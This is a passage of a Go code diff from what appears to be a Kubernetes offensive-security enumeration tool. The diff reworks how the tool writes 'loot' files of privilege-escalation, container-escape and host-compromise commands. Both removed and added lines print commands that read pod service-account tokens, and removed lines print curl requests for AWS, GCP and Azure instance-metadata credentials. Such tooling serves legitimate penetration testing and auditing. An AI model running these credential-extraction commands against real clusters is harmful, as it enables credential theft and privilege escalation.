-			// Check for cloud roles
-			if cloudProvider != "<NONE>" && cloudRole != "<NONE>" {
-				isRisky = true
-				riskFactors = append(riskFactors, fmt.Sprintf("CLOUD_ROLE_%s", cloudProvider))
-				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n# CLOUD ROLE ACCESS: %s/%s", pod.Namespace, pod.Name))
-				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("# Provider: %s, Role: %s", cloudProvider, cloudRole))
-				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
-
-				if cloudProvider == "AWS" {
-					lootPrivEsc = append(lootPrivEsc, "# Inside pod, enumerate AWS permissions:")
-					lootPrivEsc = append(lootPrivEsc, "# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/")
-					lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/%s", cloudRole))
-					lootPrivEsc = append(lootPrivEsc, "# Or use AWS CLI if available:")
-					lootPrivEsc = append(lootPrivEsc, "# aws sts get-caller-identity")
-					lootPrivEsc = append(lootPrivEsc, "# aws iam list-attached-role-policies --role-name <role>")
-				} else if cloudProvider == "GCP" {
-					lootPrivEsc = append(lootPrivEsc, "# Inside pod, enumerate GCP permissions:")
-					lootPrivEsc = append(lootPrivEsc, "# curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
-					lootPrivEsc = append(lootPrivEsc, "# gcloud auth list")
-					lootPrivEsc = append(lootPrivEsc, "# gcloud projects list")
-				} else if cloudProvider == "Azure" {
-					lootPrivEsc = append(lootPrivEsc, "# Inside pod, enumerate Azure permissions:")
-					lootPrivEsc = append(lootPrivEsc, "# curl -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'")
-					lootPrivEsc = append(lootPrivEsc, "# az account show")
-				}
-				lootPrivEsc = append(lootPrivEsc, "")
-			}
-
-			// Check for ServiceAccount tokens
-			if pod.Spec.ServiceAccountName != "" && pod.Spec.ServiceAccountName != "default" {
-				isRisky = true
-				riskFactors = append(riskFactors, "SERVICEACCOUNT")
-				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n# NON-DEFAULT SERVICEACCOUNT: %s/%s uses SA: %s", pod.Namespace, pod.Name, pod.Spec.ServiceAccountName))
-				lootPrivEsc = append(lootPrivEsc, "# Extract and use the service account token:")
-				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
-				lootPrivEsc = append(lootPrivEsc, "# Inside pod:")
-				lootPrivEsc = append(lootPrivEsc, "# SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)")
-				lootPrivEsc = append(lootPrivEsc, "# kubectl --token=$SA_TOKEN auth can-i --list")
-				lootPrivEsc = append(lootPrivEsc, "# Or from outside the cluster:")
+			// Non-default ServiceAccount
+			if finding.ServiceAccount != "" && finding.ServiceAccount != "default" {
+				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n### [%s] Non-default ServiceAccount: %s (SA: %s)", finding.RiskLevel, podID, finding.ServiceAccount))
+				lootPrivEsc = append(lootPrivEsc, "# Extract and test ServiceAccount token:")
 				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -n %s %s -- cat /var/run/secrets/kubernetes.io/serviceaccount/token", pod.Namespace, pod.Name))
+				lootPrivEsc = append(lootPrivEsc, "# Test permissions:")
+				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
+				lootPrivEsc = append(lootPrivEsc, "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)")
+				lootPrivEsc = append(lootPrivEsc, "kubectl --token=$TOKEN auth can-i --list")
 				lootPrivEsc = append(lootPrivEsc, "")
-			}
-
-			if isRisky {
-				riskyPods = append(riskyPods, fmt.Sprintf("%s/%s (%s)", pod.Namespace, pod.Name, strings.Join(riskFactors, ", ")))
 			}
 
 			// Loot: describe + jq
@@ -383,20 +613,20 @@ NodeName: .spec.nodeName,
 HostPID: .spec.hostPID,
 HostIPC: .spec.hostIPC,
 HostNetwork: .spec.hostNetwork,
-Privileged: ([.spec.initContainers[], .spec.containers[]] 
+Privileged: ([.spec.initContainers[], .spec.containers[]]
     | map(.securityContext.privileged // false) | any),
-HostPaths: ([.spec.volumes[]? | select(.hostPath) 
+HostPaths: ([.spec.volumes[]? | select(.hostPath)
     | {(.hostPath.path): .name}]),
-RunAsUser: ([.spec.initContainers[], .spec.containers[]] 
-    | map(.securityContext.runAsUser // empty) 
+RunAsUser: ([.spec.initContainers[], .spec.containers[]]
+    | map(.securityContext.runAsUser // empty)
     | map(select(. != null)) | unique),
-Capabilities: ([.spec.initContainers[], .spec.containers[]] 
-    | map(.securityContext.capabilities.add // []) 
+Capabilities: ([.spec.initContainers[], .spec.containers[]]
+    | map(.securityContext.capabilities.add // [])
     | add? // [] | unique),
-Images: ([.spec.initContainers[], .spec.containers[]] 
+Images: ([.spec.initContainers[], .spec.containers[]]
     | map(.image) | unique),
-ImageTagType: ([.spec.initContainers[], .spec.containers[]] 
-    | map(if (.image | contains(":")) then "Tagged" else "Latest" end) 
+ImageTagType: ([.spec.initContainers[], .spec.containers[]]
+    | map(if (.image | contains(":")) then "Tagged" else "Latest" end)
     | unique),
 Labels: (.metadata.labels // {}),
 Affinity: (.spec.affinity // {}),
@@ -458,6 +688,29 @@ Annotations: (.metadata.annotations // {})
 		}
 	}
 
+	// Add summaries to loot files
+	if riskCounts["CRITICAL"] > 0 || riskCounts["HIGH"] > 0 {
+		summary := fmt.Sprintf(`
+# SUMMARY: Risk Distribution
+# CRITICAL: %d pods
+# HIGH: %d pods
+# MEDIUM: %d pods
+# LOW: %d pods
+#
+# Focus on CRITICAL and HIGH risk pods first for maximum impact.
+# See detailed exploitation techniques below:
+`, riskCounts["CRITICAL"], riskCounts["HIGH"], riskCounts["MEDIUM"], riskCounts["LOW"])
+
+		lootPrivEsc = append([]string{summary}, lootPrivEsc...)
+		lootContainerEscape = append([]string{summary}, lootContainerEscape...)
+		lootHostCompromise = append([]string{summary}, lootHostCompromise...)
+	} else {
+		noRiskMsg := "\n# No CRITICAL or HIGH risk pods found.\n# Review MEDIUM risk pods manually for potential issues.\n"
+		lootPrivEsc = append(lootPrivEsc, noRiskMsg)
+		lootContainerEscape = append(lootContainerEscape, noRiskMsg)
+		lootHostCompromise = append(lootHostCompromise, noRiskMsg)
+	}
+
 	table := internal.TableFile{
 		Name:   "Pods",
 		Header: headers,
@@ -465,31 +718,28 @@ Annotations: (.metadata.annotations // {})
 	}
 
 	lootExecute := internal.LootFile{
-		Name:     "Pod-Execution",
+		Name:     "Pods-Execution",
 		Contents: strings.Join(lootExec, "\n"),
 	}
 
 	lootDescribe := internal.LootFile{
-		Name:     "Pod-Enum",
+		Name:     "Pods-Enum",
 		Contents: strings.Join(lootEnum, "\n"),
 	}
 
-	// Add summary to privilege escalation loot
-	if len(riskyPods) > 0 {
-		summary := fmt.Sprintf("\n# SUMMARY: Found %d pods with privilege escalation potential:\n", len(riskyPods))
-		for _, p := range riskyPods {
-			summary += fmt.Sprintf("# - %s\n", p)
-		}
-		summary += "#\n# See detailed exploitation techniques below:\n"
-		lootPrivEsc = append([]string{summary}, lootPrivEsc...)
-	} else {
-		lootPrivEsc = append(lootPrivEsc, "\n# No high-risk pods found with obvious privilege escalation vectors.\n")
-		lootPrivEsc = append(lootPrivEsc, "# This does not mean the cluster is secure - review pod configurations manually.\n")
+	lootPrivEscalation := internal.LootFile{
+		Name:     "Pods-Privilege-Escalation",
+		Contents: strings.Join(lootPrivEsc, "\n"),
 	}
 
-	lootPrivEscalation := internal.LootFile{
-		Name:     "Pod-Privilege-Escalation",
-		Contents: strings.Join(lootPrivEsc, "\n"),
+	lootEscape := internal.LootFile{
+		Name:     "Pods-Container-Escape",
+		Contents: strings.Join(lootContainerEscape, "\n"),
+	}
+
+	lootCompromise := internal.LootFile{
+		Name:     "Pods-Host-Compromise",
+		Contents: strings.Join(lootHostCompromise, "\n"),
 	}
 
 	err = internal.HandleOutput(
@@ -503,7 +753,7 @@ Annotations: (.metadata.annotations // {})
 		"results",
 		PodsOutput{
 			Table: []internal.TableFile{table},
-			Loot:  []internal.LootFile{lootExecute, lootDescribe, lootPrivEscalation},
+			Loot:  []internal.LootFile{lootExecute, lootDescribe, lootPrivEscalation, lootEscape, lootCompromise},
 		},
 	)
 	if err != nil {
@@ -512,7 +762,10 @@ Annotations: (.metadata.annotations // {})
 	}
 
 	if len(outputRows) > 0 {
-		logger.InfoM(fmt.Sprintf("%d pods found across %d namespaces", len(outputRows), len(namespaces.Items)), globals.K8S_PODS_MODULE_NAME)
+		logger.InfoM(fmt.Sprintf("%d pods found across %d namespaces | Risk: CRITICAL=%d, HIGH=%d, MEDIUM=%d, LOW=%d",
+			len(outputRows), len(namespaces.Items),
+			riskCounts["CRITICAL"], riskCounts["HIGH"], riskCounts["MEDIUM"], riskCounts["LOW"]),
+			globals.K8S_PODS_MODULE_NAME)
 	} else {
 		logger.InfoM("No pods found, skipping output file creation", globals.K8S_PODS_MODULE_NAME)
 	}
